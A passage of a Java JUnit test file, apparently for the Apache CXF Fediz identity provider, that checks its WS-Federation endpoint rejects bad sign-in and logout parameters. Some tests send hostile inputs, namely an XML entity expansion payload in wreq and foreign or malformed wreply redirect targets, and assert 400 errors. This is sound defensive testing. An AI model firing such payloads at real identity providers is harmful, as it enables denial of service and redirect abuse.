\"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String testWReq =\n            \"<RequestSecurityToken xmlns=\\\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\\\">\"\n            + \"<TokenType>http://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV3.0</TokenType>\"\n            + \"</RequestSecurityToken>\";\n        url += \"&wreq=\" + URLEncoder.encode(testWReq, \"UTF-8\");\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreq value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send an entity expansion attack for the wreq value\n    @org.junit.Test\n    public void testEntityExpansionWReq() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        InputStream is = this.getClass().getClassLoader().getResource(\"entity_wreq.xml\").openStream();\n        String entity = IOUtils.toString(is, \"UTF-8\");\n        is.close();\n        String validWreq =\n            \"<RequestSecurityToken xmlns=\\\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\\\">\"\n            + \"<TokenType>&m;http://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV2.0</TokenType>\"\n            + \"</RequestSecurityToken>\";\n\n        url += \"&wreq=\" + URLEncoder.encode(entity + validWreq, \"UTF-8\");\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreq value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send an malformed wreq value\n    @org.junit.Test\n    public void testMalformedWReq() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String testWReq =\n            \"<RequestSecurityToken xmlns=\\\"http://docs.oasis-open.org/ws-sx/ws-trust/200512\\\">\"\n            + \"<TokenTypehttp://docs.oasis-open.org/wss/oasis-wss-saml-token-profile-1.1#SAMLV2.0</TokenType>\"\n            + \"</RequestSecurityToken>\";\n        url += \"&wreq=\" + URLEncoder.encode(testWReq, \"UTF-8\");\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreq value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send an unknown wa value\n    @org.junit.Test\n    public void testBadWa() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin2.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wa value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send an unknown whr value\n    @org.junit.Test\n    public void testBadWHR() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A-xyz\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad whr value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 500);\n        }\n\n        webClient.close();\n    }\n\n    // Send an unknown wtrealm value\n    @org.junit.Test\n    public void testBadWtRealm() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld-xyz\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wtrealm value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send an malformed wreply value\n    @org.junit.Test\n    public void testMalformedWReply() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"/localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send a bad wreply value\n    @org.junit.Test\n    public void testBadWReply() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://www.apache.org:\" + getRpHttpsPort() + \"/\"\n            + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @org.junit.Test\n    public void testValidWReplyWrongApplication() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld2\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @org.junit.Test\n    public void testWReplyExactMatchingSuccess() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        webClient.getPage(url);\n\n        webClient.close();\n    }\n\n    @org.junit.Test\n    public void testWReplyExactMatchingFailure() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName()\n            + \"/secure/fedservlet/blah\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @org.junit.Test\n    public void testNoEndpointAddressOrConstraint() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld4\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        // This is an error in the IdP\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send a bad wreply value. This will pass the reg ex validation but fail the commons-validator\n    // validation\n    @org.junit.Test\n    public void testWReplyWithDoubleSlashes() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName()\n            + \"/secure//fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send a query parameter that's too big\n    @org.junit.Test\n    public void testLargeQueryParameterRejected() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n\n        StringBuilder sb = new StringBuilder(\"https://localhost:\" + getRpHttpsPort() + \"/\"\n                + getServletContextName() + \"/secure/fedservlet\");\n        for (int i = 0; i < 100; i++) {\n            sb.append(\"aaaaaaaaaa\");\n        }\n\n        url += \"&wreply=\" + sb.toString();\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        try {\n            webClient.getPage(url);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    // Send a query parameter that's bigger than the accepted default, but is allowed by configuration\n    @org.junit.Test\n    public void testLargeQueryParameterAccepted() throws Exception {\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n\n        StringBuilder sb = new StringBuilder(\"https://localhost:\" + getRpHttpsPort()\n                + \"/\" + getServletContextName() + \"/secure/fedservlet\");\n        for (int i = 0; i < 50; i++) {\n            sb.append(\"aaaaaaaaaa\");\n        }\n\n        url += \"&wreply=\" + sb.toString();\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        final WebClient webClient = new WebClient();\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        webClient.getPage(url);\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogout() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT;\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        idpPage = webClient.getPage(idpLogoutUrl);\n\n        Assert.assertEquals(\"IDP SignOut Confirmation Response Page\", idpPage.getTitleText());\n\n        HtmlForm form = idpPage.getFormByName(\"signoutconfirmationresponseform\");\n        HtmlSubmitInput button = form.getInputByName(\"_eventId_submit\");\n        button.click();\n\n        webClient.close();\n\n        // 3. now we try to access the idp without authentication but with the existing cookies\n        // to see if we are really logged out\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\n        idpPage = webClient.getPage(url);\n\n        Assert.assertEquals(401, idpPage.getWebResponse().getStatusCode());\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutCleanup() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT_CLEANUP;\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        idpPage = webClient.getPage(idpLogoutUrl);\n\n        Assert.assertEquals(\"IDP SignOut Response Page\", idpPage.getTitleText());\n\n        webClient.close();\n\n        // 3. now we try to access the idp without authentication but with the existing cookies\n        // to see if we are really logged out\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\n        idpPage = webClient.getPage(url);\n\n        Assert.assertEquals(401, idpPage.getWebResponse().getStatusCode());\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutCleanupWithBadWReply() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP using a bad wreply\n        String badWReply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName()\n            + \"/secure//fedservlet\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT_CLEANUP;\n        idpLogoutUrl += \"&wreply=\" + badWReply;\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        try {\n            webClient.getPage(idpLogoutUrl);\n            Assert.fail(\"Failure expected on a bad wreply value\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n\n        // 3. now we try to access the idp without authentication but with the existing cookies\n        // to see if we are really logged out. Even though an error was thrown on a bad wreply, we should still\n        // be logged out\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\n        idpPage = webClient.getPage(url);\n\n        Assert.assertEquals(401, idpPage.getWebResponse().getStatusCode());\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithWreplyConstraint() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply\n            + \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        idpPage = webClient.getPage(idpLogoutUrl);\n\n        Assert.assertEquals(\"IDP SignOut Confirmation Response Page\", idpPage.getTitleText());\n\n        HtmlForm form = idpPage.getFormByName(\"signoutconfirmationresponseform\");\n        HtmlSubmitInput button = form.getInputByName(\"_eventId_submit\");\n        button.click();\n\n        webClient.close();\n\n        // 3. now we try to access the idp without authentication but with the existing cookies\n        // to see if we are really logged out\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\n        idpPage = webClient.getPage(url);\n\n        Assert.assertEquals(401, idpPage.getWebResponse().getStatusCode());\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithWreplyBadAddress() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345/badlogout\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply\n            + \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        try {\n            webClient.getPage(idpLogoutUrl);\n            Assert.fail(\"Failure expected on a non-matching wreply address\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithNoRealm() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        